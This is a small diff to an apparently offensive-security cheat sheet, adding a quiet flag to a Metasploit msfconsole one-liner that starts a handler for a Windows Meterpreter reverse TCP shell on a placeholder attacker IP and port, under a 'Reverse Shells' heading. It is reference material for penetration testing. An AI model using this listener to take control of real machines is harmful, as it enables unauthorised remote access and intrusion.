@@ -18,7 +18,7 @@
 
 ```bash
 # E.g. Metapreter Reverse TCP
-msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST <attacker_ip>;set LPORT <port>;run;"
+msfconsole -q -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST <attacker_ip>;set LPORT <port>;run;"
 ```
 
 ## Reverse Shells
